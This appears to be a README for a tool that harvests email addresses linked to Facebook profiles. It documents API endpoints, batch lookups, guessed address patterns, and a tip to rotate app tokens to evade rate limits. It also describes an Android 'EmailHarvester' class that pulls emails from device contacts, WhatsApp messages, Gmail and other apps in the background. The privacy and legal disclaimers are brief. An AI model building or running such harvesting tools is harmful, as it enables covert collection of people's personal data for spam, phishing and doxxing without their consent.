# Facebook Email Fetching System

## Overview

This system allows you to extract email addresses associated with Facebook profiles using multiple methods and data sources. It's designed for cybersecurity research and red team operations.

## Features

### 🔍 Multiple Extraction Methods

1. **Facebook API** - Direct extraction from public profile data
2. **Posts Analysis** - Extract emails from posts and comments
3. **Database Cross-reference** - Use previously collected data
4. **Pattern Generation** - Generate likely email patterns
5. **Gmail Integration** - Cross-reference with Gmail data

### 📊 Confidence Levels

- **High** - Directly from Facebook API or verified sources
- **Medium** - From posts, comments, or cross-referenced data
- **Low** - From user-generated content
- **Very Low** - Generated patterns (guessed emails)

## API Endpoints

### 1. Fetch Emails by Facebook ID

```http
GET /api/facebook/emails/{facebookId}?method={method}
```

**Parameters:**
- `facebookId` - The Facebook profile ID
- `method` - Extraction method (optional, defaults to 'all')
  - `all` - Use all methods
  - `facebook_api` - Only Facebook API
  - `posts` - Only posts analysis
  - `database` - Only database cross-reference
  - `pattern` - Only pattern generation
  - `gmail` - Only Gmail cross-reference

**Example:**
```bash
curl "http://localhost:5001/api/facebook/emails/100001234567890?method=all"
```

**Response:**
```json
{
  "success": true,
  "message": "Found 5 unique emails for Facebook ID: 100001234567890",
  "data": {
    "facebookId": "100001234567890",
    "totalEmails": 5,
    "emails": [
      {
        "email": "john.doe@gmail.com",
        "source": "facebook_api",
        "confidence": "high",
        "extractedAt": "2025-07-15T00:00:00.000Z"
      },
      {
        "email": "john.doe@yahoo.com",
        "source": "pattern_generation",
        "confidence": "very_low",
        "extractedAt": "2025-07-15T00:00:00.000Z"
      }
    ],
    "methodsUsed": ["facebook_api", "posts", "database", "pattern", "gmail"]
  }
}
```

### 2. Get Facebook Profile

```http
GET /api/facebook/profile/{profileId}
```

### 3. Get Facebook Posts

```http
GET /api/facebook/posts/{profileId}?limit={limit}
```

### 4. Search Facebook Profiles

```http
GET /api/facebook/search?query={query}&type={type}
```

## Setup Instructions

### 1. Environment Variables

Add these to your `.env` file:

```bash
# Facebook API Configuration
FACEBOOK_APP_TOKEN=your_facebook_app_token
FACEBOOK_PAGE_TOKEN=your_facebook_page_token

# Database Configuration
MONGO_URL=your_mongodb_connection_string
```

### 2. Facebook App Setup

1. Go to [Facebook Developers](https://developers.facebook.com/)
2. Create a new app
3. Add Facebook Login product
4. Get your App Token
5. Configure permissions for:
   - `email`
   - `public_profile`
   - `user_posts` (if available)

### 3. Install Dependencies

```bash
npm install axios mongoose
```

## Usage Examples

### Basic Email Fetching

```javascript
const axios = require('axios');

async function fetchEmails(facebookId) {
  try {
    const response = await axios.get(`http://localhost:5001/api/facebook/emails/${facebookId}`);
    
    if (response.data.success) {
      console.log(`Found ${response.data.data.totalEmails} emails:`);
      response.data.data.emails.forEach(email => {
        console.log(`- ${email.email} (${email.confidence})`);
      });
    }
  } catch (error) {
    console.error('Error:', error.message);
  }
}

fetchEmails('100001234567890');
```

### Specific Method Usage

```javascript
// Only use Facebook API
const response = await axios.get(`http://localhost:5001/api/facebook/emails/${facebookId}?method=facebook_api`);

// Only use pattern generation
const response = await axios.get(`http://localhost:5001/api/facebook/emails/${facebookId}?method=pattern`);

// Only use posts analysis
const response = await axios.get(`http://localhost:5001/api/facebook/emails/${facebookId}?method=posts`);
```

### Batch Processing

```javascript
const facebookIds = ['100001234567890', '100001234567891', '100001234567892'];

async function batchFetchEmails(ids) {
  const results = [];
  
  for (const id of ids) {
    try {
      const response = await axios.get(`http://localhost:5001/api/facebook/emails/${id}`);
      results.push({
        facebookId: id,
        success: response.data.success,
        emails: response.data.data.emails || []
      });
      
      // Rate limiting
      await new Promise(resolve => setTimeout(resolve, 1000));
    } catch (error) {
      results.push({
        facebookId: id,
        success: false,
        error: error.message
      });
    }
  }
  
  return results;
}
```

## Mobile App Integration

### Android Email Harvester

The system includes an Android `EmailHarvester` class that can:

- Extract emails from device contacts
- Harvest emails from WhatsApp messages
- Extract emails from Facebook app data
- Harvest emails from Gmail
- Extract emails from other messaging apps

### Usage in Android

```java
EmailHarvester harvester = new EmailHarvester(context);
harvester.startHarvesting(); // Start background harvesting
harvester.harvestAll(); // One-time harvest
```

## Security Considerations

### ⚠️ Legal and Ethical Use

- Only use on profiles you own or have explicit permission to access
- Respect privacy settings and terms of service
- Use for legitimate security research only
- Comply with local laws and regulations

### 🔒 Data Protection

- Store extracted data securely
- Implement proper access controls
- Use encryption for sensitive data
- Regular security audits

### 📊 Rate Limiting

- Implement rate limiting to avoid API restrictions
- Respect Facebook's API limits
- Use delays between requests
- Monitor API usage

## Troubleshooting

### Common Issues

1. **401 Unauthorized**
   - Check Facebook app token
   - Verify app permissions
   - Ensure token is valid

2. **404 Not Found**
   - Verify Facebook ID is correct
   - Check if profile is public
   - Ensure app has proper permissions

3. **Rate Limiting**
   - Implement delays between requests
   - Use multiple app tokens
   - Monitor API usage

### Debug Mode

Enable debug logging:

```javascript
// In your controller
console.log('🔍 Fetching emails for Facebook ID:', facebookId);
console.log('📧 Emails found:', emails);
```

## Testing

Run the test script:

```bash
cd backend
node test-email-fetching.js
```

This will test all endpoints and methods.

## Advanced Features

### Custom Email Patterns

Add custom email generation patterns:

```javascript
// In facebookController.js
const customPatterns = [
  `${firstName}${lastName}@company.com`,
  `${username}@domain.com`,
  `${firstName}.${lastName}@business.com`
];
```

### Database Integration

The system automatically saves extracted emails to MongoDB:

```javascript
// Emails are saved in FacebookProfile model
{
  profileId: "100001234567890",
  extractedEmails: [
    {
      email: "john.doe@gmail.com",
      source: "facebook_api",
      confidence: "high",
      extractedAt: "2025-07-15T00:00:00.000Z"
    }
  ],
  lastEmailExtraction: "2025-07-15T00:00:00.000Z"
}
```

### Webhook Integration

Set up webhooks for real-time email extraction:

```javascript
// Webhook endpoint
app.post('/api/facebook/webhook', (req, res) => {
  const { facebookId, event } = req.body;
  
  if (event === 'profile_update') {
    // Trigger email extraction
    fetchEmailsByFacebookId({ params: { facebookId } }, res);
  }
  
  res.status(200).send('OK');
});
```

## Support

For issues and questions:
1. Check the troubleshooting section
2. Review API documentation
3. Test with the provided test script
4. Check server logs for errors

## License

This system is for educational and research purposes only. Use responsibly and in compliance with applicable laws. 